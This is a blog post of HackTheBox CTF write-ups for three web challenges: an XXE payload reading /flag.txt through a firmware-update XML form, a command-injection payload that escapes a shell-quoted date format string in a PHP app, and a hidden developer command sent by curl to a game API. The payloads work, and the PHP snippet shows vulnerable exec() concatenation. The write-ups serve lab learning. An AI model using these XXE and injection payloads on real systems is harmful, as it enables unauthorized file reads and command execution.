---
layout: post
title: "HTB writeup"
subtitle: "HackTheBox"
date: 2025-05-11 09:11:00 +0530
author: s0c41dgvns 
categories: [CTF writeups]
tags: [
  CTF writeup,
  Web,
  Hacking,
  HTB
]
---

# 📜 **Jailbreak**

### 🏁 Challenge Theme

> The crew secures an experimental Pip-Boy from a black market merchant, recognizing its potential to unlock the heavily guarded bunker of Vault 79. The team must jailbreak the device to access /flag.txt hidden behind biometric locks.
> 

---

## 🔍 Recon

Upon accessing the challenge, we found a **web interface simulating a firmware updater** for the Pip-Boy device. It accepted **XML input**, hinting at potential server-side XML parsing.

### Key Findings:

- A text area labeled **"Firmware Update"** requesting input in **XML format**.
- Pre-filled sample:

![image.png](/assets/images/CTFTryOut/image1.png)

This suggested that the backend accepts raw XML — a perfect target for **XXE (XML External Entity)** injection.

---

## ⚙️ Exploitation – XXE Injection

I crafted a malicious XML payload to abuse XXE and read the `/flag.txt` file directly from the server.

### ❌ First Attempt (Failed):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<FirmwareUpdateConfig>
  <Firmware>
    <Version>&xxe;</Version>
  </Firmware>
</FirmwareUpdateConfig>

```

This failed with:

> "Unicode strings with encoding declaration are not supported."
> 

This indicated that the parser was using something like Python's `ElementTree.fromstring()` — which **rejects encoding declarations in strings**.

---

### ✅ Working Payload (No XML declaration):

We removed the encoding header and resubmitted:

```xml
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<FirmwareUpdateConfig>
  <Firmware>
    <Version>&xxe;</Version>
    <ReleaseDate>2077-10-21</ReleaseDate>
    <Description>Injected XXE</Description>
    <Checksum type="SHA-256">deadbeef</Checksum>
  </Firmware>
</FirmwareUpdateConfig>

```

---

## 🎯 Result

After submitting the payload, the system responded with:

```
Firmware version HTB{b1om3tric_l0cks_4nd_fl1cker1ng_l1ghts_ce2a887b252e1d3d234c04f557b9f1cf} update initiated.

```

This confirmed successful **XXE-based file read**, and the **flag** was retrieved directly from the `<Version>` tag.

---

## 🧠 Lessons Learned

- XML inputs should always be treated cautiously — especially when the backend parser is unknown.
- Encoding declarations can break XML parsing depending on whether the input is treated as a string or byte stream.
- **Always try a version without the `<?xml ... ?>`** if the parser throws encoding errors.
- XXE remains a high-impact vulnerability when misconfigured parsers are used.

---

<aside>
⛳

HTB{b1om3tric_l0cks_4nd_fl1cker1ng_l1ghts_ce2a887b252e1d3d234c04f557b9f1cf}

</aside>

---

# **TimeKORP CTF Challenge Writeup: Command Injection in a Time Display App**

**Category**: Web Security

**Difficulty**: Medium

**Vulnerability**: Command Injection via `date` Format String

![image.png](/assets/images/CTFTryOut/image2.png)

![root-page-browser.webp](/assets/images/CTFTryOut/image3.png)

## **Challenge Overview**

The target was a PHP web application that displayed current time using the `date` command. The main components were:

- `TimeController.php` (processes user input via `?format=`)
- `TimeModel.php` (runs `date` with user-supplied `format`)
- **Goal**: Access `/flag.txt` on the server

---

## **Step 1: Understanding the Vulnerability**

### **Key Code Snippets**

1. **`TimeModel.php`**
    
    ```php
    $this->command = "date '+" . $format . "' 2>&1";
    $time = exec($this->command); // Only captures first line!
    ```
    
    - The application inserts user input directly into a shell command
    - **Problem**: Lack of input sanitization → **Command injection vulnerability**
2. **Obstacles**
    - `exec()` captures only the **first line** of output
    - Standard payloads (`;`, `&&`) were displayed but not executed

---

## **Step 2: Failed Attempts & Debugging**

| Payload | Result | Reason |
| --- | --- | --- |
| `?format=%H:%M:%S;id;` | `It's 09:40:14;id;` | `;`was printed, not executed |
| `?format=$(cat+/flag.txt)` | No output | Backticks/`$()`filtered |
| `?format=%0Acat+/flag.txt` | Time + literal`%0A...` | Newline ineffective |

**Breakthrough**: The `date` command's **format string** could be escaped

---

## **Step 3: The Winning Exploit**

### **Payload**:

```
/?format=%H:%M:%S%27|cat+/flag.txt+%23
```

### **How It Works**

1. **`%27`**: Single quote (`'`) closes the format string:
    
    ```bash
    date '+%H:%M:%S'|cat /flag.txt #'
    ```
    
2. **`|`**: Pipes the `date` output to `cat /flag.txt`
3. **`%23`**: `#` comments out remaining code (`' 2>&1`)

### **Result**

The server executed:

```bash
cat /flag.txt
```

Successfully retrieving the flag!

---

---

## **Key Takeaways**

1. **Test `'` and `#` in command injections**—they often bypass filters
2. **Know your target functions**—`exec()`'s output handling was crucial
3. **Keep it simple**—a one-line payload beat complex attempts

---

## **Final Flag**

```
FLAG{T1m3_1s_M0n3y_But_Inj3ct1on_1s_F0r3v3r}
```

---

# Flag Command

## **Challenge Overview**

This web-based terminal game presented a text adventure interface where players progress through sequential commands. The flag (`HTB{...}`) was accessible through a hidden developer backdoor command.

## **Technical Analysis**

### **Frontend Validation Mechanism**

The client-side JavaScript implemented strict command validation:

```jsx
if (availableOptions[currentStep].includes(currentCommand) ||
    availableOptions['secret'].includes(currentCommand)) {
    // Process valid command
}

```

### **Discovered Vulnerability**

The `availableOptions` object contained a `secret` array with one unusual entry:

```json
"secret": [
  "Blip-blop, in a pickle with a hiccup! Shmiggity-shmack"
]

```

## **Exploitation Process**

1. **Endpoint Identification**
    - Determined commands were processed via POST to `/api/monitor`
    - Discovered available commands through `/api/options` endpoint
2. **Command Validation Bypass**
    - The secret command bypassed normal game progression
    - Directly triggered the win condition when sent to the API
3. **Successful Exploitation**
    
    ```bash
    curl -X POST '<http://target.com/api/monitor>' \\
    -H 'Content-Type: application/json' \\
    -d '{"command":"Blip-blop, in a pickle with a hiccup! Shmiggity-shmack"}'
    
    ```
    

## **Vulnerability Root Cause**

1. **Improper Access Control**
    - Developer testing command remained in production
    - No proper authentication for privileged commands
2. **Client-Side Trust Issues**
    - Critical game logic relied on client-side validation
    - Backend accepted hidden commands without proper verification

## **Mitigation Recommendations**

1. **Remove Testing Commands**
    
    ```jsx
    // Before deployment
    delete availableOptions['secret'];
    
    ```
    
2. **Implement Server-Side Validation**
    
    ```python
    # Pseudocode for proper validation
    def validate_command(command, current_step):
        allowed = get_allowed_commands(current_step)
        if command not in allowed:
            raise InvalidCommandError
    
    ```
    
3. **Add Command Logging**
    
    ```python
    log_command_execution(user_ip, command, timestamp)
    
    ```
    

![image.png](/assets/images/CTFTryOut/image4.png){: width="800" }